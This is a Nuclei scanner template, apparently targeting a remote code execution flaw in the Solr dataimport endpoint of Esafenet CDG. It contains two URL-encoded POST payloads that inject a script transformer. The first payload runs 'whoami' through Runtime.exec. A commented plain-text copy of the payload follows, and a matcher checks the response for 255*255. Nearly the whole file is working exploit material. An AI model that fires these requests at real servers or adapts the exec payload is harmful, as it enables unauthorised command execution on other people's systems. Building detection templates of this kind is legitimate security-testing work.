id: esafenet-cdgserver3-solr-rce

info:
  name: 亿赛通solr rce
  author: pphua
  severity: critical
  tags: esafenet,solr,rce,webapp
  description: 亿赛通solr rce
  reference:
    - https://

http:
  - raw:
      - |
        POST /solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0a%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0a%3c%64%61%74%61%53%6f%75%72%63%65%20%6e%61%6d%65%3d%22%73%74%72%65%61%6d%73%72%63%22%20%74%79%70%65%3d%22%43%6f%6e%74%65%6e%74%53%74%72%65%61%6d%44%61%74%61%53%6f%75%72%63%65%22%20%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%22%54%52%41%43%45%22%20%2f%3e%0a%0a%20%20%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%0a%20%20%20%20%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%70%6f%63%28%72%6f%77%29%7b%0a%20%20%20%20%20%20%20%20%0a%20%20%20%20%20%20%20%20%76%61%72%20%72%65%73%75%6c%74%20%3d%20%5b%5d%3b%0a%20%20%20%20%20%20%20%20%72%65%73%75%6c%74%2e%70%75%73%68%28%53%74%72%69%6e%67%28%32%35%35%2a%32%35%35%29%29%3b%0a%20%20%20%20%20%20%20%20%72%65%73%75%6c%74%2e%70%75%73%68%28%6a%61%76%61%2e%6c%61%6e%67%2e%53%79%73%74%65%6d%2e%67%65%74%50%72%6f%70%65%72%74%79%28%22%75%73%65%72%2e%6e%61%6d%65%22%29%29%3b%0a%20%20%20%20%20%20%20%20%20%72%65%73%75%6c%74%2e%70%75%73%68%28%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%77%68%6f%61%6d%69%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%2e%72%65%61%64%4c%69%6e%65%28%29%29%3b%0a%20%20%20%20%20%20%20%20%72%6f%77%2e%70%75%74%28%22%74%69%74%6c%65%22%2c%72%65%73%75%6c%74%2e%6a%6f%69%6e%28%22%20%22%29%29%3b%0a%20%20%20%20%20%20%20%20%72%65%74%75%72%6e%20%72%6f%77%3b%0a%20%20%20%20%20%20%20%20%7d%0a%0a%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0a%0a%3c%64%6f%63%75%6d%65%6e%74%3e%0a%20%20%20%20%3c%65%6e%74%69%74%79%0a%20%20%20%20%20%20%20%20%73%74%72%65%61%6d%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%6e%61%6d%65%3d%22%65%6e%74%69%74%79%31%22%0a%20%20%20%20%20%20%20%20%64%61%74%61%73%6f%75%72%63%65%3d%22%73%74%72%65%61%6d%73%72%63%31%22%0a%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0a%20%20%20%20%20%20%20%20%72%6f%6f%74%45%6e%74%69%74%79%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%52%44%46%2f%69%74%65%6d%22%0a%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%73%63%72%69%70%74%3a%70%6f%63%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%66%69%65%6c%64%20%63%6f%6c%75%6d%6e%3d%22%74%69%74%6c%65%22%20%78%70%61%74%68%3d%22%2f%52%44%46%2f%69%74%65%6d%2f%74%69%74%6c%65%22%20%2f%3e%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0a%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e%0a%20%20%20%20%0a%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Language: en-US,en;q=0.9
        Connection: close

        <?xml version="1.0" encoding="UTF-8"?>
        <RDF>
        <item/>
        </RDF>

      - |
        POST /solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0a%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0a%3c%64%61%74%61%53%6f%75%72%63%65%20%6e%61%6d%65%3d%22%73%74%72%65%61%6d%73%72%63%22%20%74%79%70%65%3d%22%43%6f%6e%74%65%6e%74%53%74%72%65%61%6d%44%61%74%61%53%6f%75%72%63%65%22%20%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%22%54%52%41%43%45%22%20%2f%3e%0a%0a%20%20%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%0a%20%20%20%20%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%70%6f%63%28%72%6f%77%29%7b%0a%20%20%20%20%20%20%20%20%0a%20%20%20%20%20%20%20%20%76%61%72%20%72%65%73%75%6c%74%20%3d%20%5b%5d%3b%0a%20%20%20%20%20%20%20%20%72%65%73%75%6c%74%2e%70%75%73%68%28%53%74%72%69%6e%67%28%32%35%35%2a%32%35%35%29%29%3b%0a%20%20%20%20%20%20%20%20%72%65%73%75%6c%74%2e%70%75%73%68%28%6a%61%76%61%2e%6c%61%6e%67%2e%53%79%73%74%65%6d%2e%67%65%74%50%72%6f%70%65%72%74%79%28%22%75%73%65%72%2e%6e%61%6d%65%22%29%29%3b%0a%20%20%20%20%20%20%20%20%20%0a%20%20%20%20%20%20%20%20%72%6f%77%2e%70%75%74%28%22%74%69%74%6c%65%22%2c%72%65%73%75%6c%74%2e%6a%6f%69%6e%28%22%20%22%29%29%3b%0a%20%20%20%20%20%20%20%20%72%65%74%75%72%6e%20%72%6f%77%3b%0a%20%20%20%20%20%20%20%20%7d%0a%0a%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0a%0a%3c%64%6f%63%75%6d%65%6e%74%3e%0a%20%20%20%20%3c%65%6e%74%69%74%79%0a%20%20%20%20%20%20%20%20%73%74%72%65%61%6d%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%6e%61%6d%65%3d%22%65%6e%74%69%74%79%31%22%0a%20%20%20%20%20%20%20%20%64%61%74%61%73%6f%75%72%63%65%3d%22%73%74%72%65%61%6d%73%72%63%31%22%0a%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0a%20%20%20%20%20%20%20%20%72%6f%6f%74%45%6e%74%69%74%79%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%52%44%46%2f%69%74%65%6d%22%0a%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%73%63%72%69%70%74%3a%70%6f%63%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%66%69%65%6c%64%20%63%6f%6c%75%6d%6e%3d%22%74%69%74%6c%65%22%20%78%70%61%74%68%3d%22%2f%52%44%46%2f%69%74%65%6d%2f%74%69%74%6c%65%22%20%2f%3e%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0a%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e%0a%20%20%20%20%0a%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Language: en-US,en;q=0.9
        Connection: close

        <?xml version="1.0" encoding="UTF-8"?>
        <RDF>
        <item/>
        </RDF>

    extractors:
      - type: xpath
        part: body
        xpath:
          - //arr[@name='title']//text()

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "65025"
        part: body

#<dataConfig>
#<dataSource name="streamsrc" type="ContentStreamDataSource" loggerLevel="TRACE" />
#
#  <script><![CDATA[
#        function poc(row){
#
#        var result = [];
#        result.push(String(255*255));
#        result.push(java.lang.System.getProperty("user.name"));
#
#        result.push(new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("whoami").getInputStream())).readLine());
#
#        row.put("title",result.join(" "));
#        return row;
#        }
#
#]]></script>
#
#<document>
#    <entity
#        stream="true"
#        name="entity1"
#        datasource="streamsrc1"
#        processor="XPathEntityProcessor"
#        rootEntity="true"
#        forEach="/RDF/item"
#        transformer="script:poc">
#             <field column="title" xpath="/RDF/item/title" />
#    </entity>
#</document>
#</dataConfig>